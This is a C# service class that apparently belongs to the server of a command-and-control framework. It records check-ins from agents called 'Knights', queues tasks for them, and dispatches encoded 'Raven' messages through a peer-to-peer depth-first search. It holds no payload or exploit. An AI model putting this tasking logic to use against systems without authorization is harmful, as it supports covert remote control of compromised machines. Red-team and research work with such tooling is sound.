using Castle.Interfaces;
using Castle.Models.Raven;
using Castle.Models.Knight;
using Castle.RavenModules;
using Castle.Utils;
using System.Reflection;

namespace Castle.Services
{
    public class RavenService : IRavenService
    {
        public IKnightService KnightService  { get; }
        public IKnightHistoryService KnightHistoryService { get; }
        public IPeerToPeerService PeerToPeerService { get; }

        private readonly List<RavenModule> _ravenModules = new List<RavenModule>();
        public RavenService(IKnightService soldierService, IKnightHistoryService soldierHistoryService, IPeerToPeerService peerToPeerService)
        {
            KnightService = soldierService;
            KnightHistoryService = soldierHistoryService;
            PeerToPeerService = peerToPeerService;

            LoadRavenModules();
        }

        public async Task HandleInboundRaven(Raven raven)
        {
            // Check in 
            var soldier = await KnightService.GetKnight(raven.KnightId);
            if (soldier != null)
            {
                soldier.CheckIn();
                await KnightService.Update(soldier);
            }

            // Handle frame in respective module
            var module = _ravenModules.FirstOrDefault(m => m.RavenType == raven.Type);
            if (module != null)
            {
                await module.ProcessRaven(raven);
            }
        }

        public async Task HandleInboundRavens(IEnumerable<Raven> ravens)
        {
            foreach (Raven raven in ravens)
            {
                await HandleInboundRaven(raven);
            }
        }

        //public async Task<IEnumerable<Raven>> GetOutboundRavens(string soldierId)
        //{
        //    // REPLACE LOGIC WHEN P2P IS INPLEMENTED

        //    var outboundRaves = new List<Raven>();

        //    // Get pending for Soldier
        //    var pending = (await SoldierHistoryService.GetPending(soldierId)).ToList();

        //    // Update each task to TASKED
        //    foreach (var history in pending)
        //    {
        //        history.Status = SOLDIER_TASK_STATUS.TASKED;
        //        history.TaskSentAt = DateTime.UtcNow;

        //        // map to TaskMessage
        //        var taskMsg = (TaskMessage)history;

        //        // make raven
        //        var raven = new Raven(history.SoldierId, RavenType.TASK, Crypto.Encode(taskMsg));
        //        outboundRaves.Add(raven);
        //    }

        //    await SoldierHistoryService.Update(pending);


        //    return outboundRaves;
        //}

        //public async Task<IEnumerable<Raven>> GetOutboundRavens(SoldierMetadata metadata)
        //{
        //    await HandleCheckIn(metadata);

        //    // ADD LOGIC WHEN P2P IS INPLEMENTED

        //    var outboundRaves = new List<Raven>();

        //    // Get pending for Soldier
        //    var pending = (await SoldierHistoryService.GetPending(metadata.Id)).ToList();

        //    // Update each task to TASKED
        //    foreach (var history in pending)
        //    {
        //        history.Status = SOLDIER_TASK_STATUS.TASKED;
        //        history.TaskSentAt = DateTime.UtcNow;

        //        // map to TaskMessage
        //        var taskMsg = (TaskMessage)history;

        //        // make raven
        //        var raven = new Raven(history.SoldierId, RavenType.TASK, Crypto.Encode(taskMsg));
        //        outboundRaves.Add(raven);
        //    }

        //    await SoldierHistoryService.Update(pending);


        //    return outboundRaves;
        //}

        public async Task<IEnumerable<Raven>> GetOutboundRavens(KnightMetadata metadata)
        {
            await HandleCheckIn(metadata);

            //var soldiers = await SoldierService.GetSoldiers(); // REPLACE WITH P2P DEPTH FIRST SEARCH ...
            var search = PeerToPeerService.DepthFirstSearch(metadata.Id);

            Console.WriteLine("== GetOutboundRavens");
            PeerToPeerService.PrintVertexes(search);

            var outboundRavens = new List<Raven>();
            foreach (var soldierId in search)
            {
                // Get pending for Soldier
                var pending = (await KnightHistoryService.GetPending(soldierId)).ToList();

                // Update each task to TASKED
                foreach (var history in pending)
                {
                    history.Status = KNIGHT_TASK_STATUS.TASKED;
                    history.TaskSentAt = DateTime.UtcNow;

                    // map to TaskMessage
                    var taskMsg = (TaskMessage)history;

                    // make raven
                    var raven = new Raven(history.KnightId, RavenType.TASK, Crypto.Encode(taskMsg));
                    outboundRavens.Add(raven);
                }

                await KnightHistoryService.Update(pending);
            }

            //return outboundRavens;
            return outboundRavens.ToArray().Reverse();
        }
        private async Task HandleCheckIn(KnightMetadata metadata)
        {
            var soldier = await KnightService.GetKnight(metadata.Id);

            if (soldier == null) // This would mean the soldier has NOT sent a CheckInMessage...
            {
                soldier = new Knight(metadata);

                soldier.CheckIn();
                await KnightService.AddKnight(soldier);

                // Add vertex to P2P
                PeerToPeerService.AddVertex(soldier.Metadata.Id);
            }
            else
            {
                soldier.CheckIn();
                await KnightService.Update(soldier);
            }
        }

        private void LoadRavenModules()
        {
            var self = Assembly.GetExecutingAssembly();

            foreach (var type in self.GetTypes())
            {
                if (type.IsSubclassOf(typeof(RavenModule)))
                {
                    var module = (RavenModule?)Activator.CreateInstance(type);

                    if (module != null)
                    {
                        module.Init(this);
                        _ravenModules.Add(module);
                    }
                }
            }
        }
    }
}
